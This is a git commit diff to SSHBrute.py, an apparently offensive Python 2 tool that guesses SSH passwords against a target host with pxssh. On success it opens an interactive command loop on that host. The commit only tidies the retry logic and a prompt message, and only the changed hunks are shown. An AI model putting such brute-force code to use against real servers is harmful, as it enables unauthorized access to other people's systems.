79cfce2e91a5af285a98eb97889b84ac6d2f3609
Vincent Zheng <VincentZheng174@gmail.com>
2018-01-24 01:36:33 -0500

    Update SSHBrute.py

--- Files/SSHBrute.py
+++ Files/SSHBrute.py
@@ -4,7 +4,7 @@ import argparse
 import time
 
 def SSHConnect(host, username, password):
-	Fails = 0
+	fails = 0
 
 	try:
 		s = pxssh.pxssh()
@@ -12,15 +12,12 @@ def SSHConnect(host, username, password):
 		print "Password Found: " + password
 		return s
 	except Exception, x:
-		if Fails > 5:
+		if fails > 5:
 			print "[!]Socket Timed Out"
 			exit(0)
-		elif "read_nonblocking" in str(x):
-			Fails += 1
-			time.sleep(5)
-			return SSHConnect(host, username, password)
-		elif "synchronize with original prompt" in str(x):
-			time.sleep(1)
+		else:
+			fails += 1
+			time.sleep(3)
 			return SSHConnect(host, username, password)
 		return None
 
@@ -38,7 +35,7 @@ def Main():
 				print "Testing: " + str(password)
 				con = SSHConnect(args.host, args.username, password)
 				if con:
-						print "[!]SSH Connection has been established, Issue Commands type Q to quit."
+						print "[!]SSH Connection has been established, Issue Commands or type Q to quit."
 						cmd = raw_input("$ ")
 						while cmd != 'q' and cmd != 'Q':
 							con.sendline(cmd)
